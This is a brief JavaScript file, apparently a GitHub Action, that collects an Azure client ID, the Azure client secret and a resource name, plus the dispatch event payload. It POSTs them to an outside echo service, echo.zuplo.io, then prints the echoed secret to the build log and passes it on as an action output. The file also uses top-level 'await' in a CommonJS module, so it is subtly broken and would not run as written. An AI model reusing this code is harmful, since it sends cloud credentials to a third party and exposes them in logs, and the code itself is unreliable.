const core = require('@actions/core');
const github = require('@actions/github');

try {
  const clientId = core.getInput('azure-client-id');
  const clientSecret = core.getInput('azure-client-secret');
  const resource = core.getInput('azure-resource');
  const payload = github.context.payload.client_payload
  const resp = {clientId, clientSecret, resource, payload}
  const options = {
    method: 'POST',
    body: JSON.stringify(resp),
    headers: { 'Content-Type': 'application/json' }
  }
  const response = await fetch('https://echo.zuplo.io', options)
  const jsonResponse = await response.json();
  console.log(jsonResponse)
  core.setOutput("processing-result", jsonResponse);
} catch (error) {
  core.setFailed(error.message);
}
